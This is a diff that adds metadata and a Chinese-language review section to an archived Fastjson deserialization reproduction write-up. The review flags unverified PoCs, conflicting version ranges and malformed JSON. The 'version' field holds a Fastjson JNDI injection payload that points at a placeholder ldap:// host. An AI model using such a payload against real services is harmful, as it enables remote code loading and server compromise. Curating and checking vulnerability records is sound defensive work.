@@ -1,7 +1,42 @@
 ---
 version: "{'@type':'org.apache.shiro.jndi.JndiObjectFactory','resourceName':'ldap://ip:138"
 source: "MrWQ/vulnerability-paper"
+product: "Fastjson JNDI/cache bypass"
+record_type: "analysis"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+identifier_status: "unknown"
+title: "漏洞复现 Fastjson 系列"
+prerequisites: "来源所述条件，未列明部分仍待核：Lab1.2.47; list<=24/41/42/43/45/47/62/66; later headings use< not<=; runtime/third-party gadget prerequisites incomplete"
+side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
+source_status: "recorded"
+source_url: "https://mp.weixin.qq.com/s/5ebWECpbpX3-c7PEml2NVA"
+id: "vw-8c3823a437a3f2edcb15f7c0"
+entity_id: "ve-8c3823a437a3f2edcb15f7c0"
+schema_version: "1"
 ---
+
+## 核对与使用边界
+
+本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。
+
+适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Lab1.2.47; list&lt;=24/41/42/43/45/47/62/66; later headings use&lt; not&lt;=; runtime/third-party gadget prerequisites incomplete
+
+代码与实验材料：Two RMI tooling workflows and Java class examples; first mixes generated-tool and manual class flow; claim deleting class allows repeat ignores target classloader cache
+
+来源证据范围：Original WeChat, official marshalsec/wyzxxz repos, no primary fixes
+
+- **事实待核（1）**：InetAddress DNS response presented as vulnerability proof rather than parser behavior; primary version metadata unusable。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。
+
+- **代码与转录边界（2）**：Affected boundary contradictions and absent AutoType/dependency requirements in older sections; malformed/collapsed JSON。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。
+
+- **来源与引用处置（3）**：Commercial/footer bulk, no remediation, repeated setup。保留这部分来源材料并与技术结论分开；其引用或宣传内容不能补足本文漏洞的证据。
+
+历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。
 
 # 【漏洞复现】Fastjson 系列
 
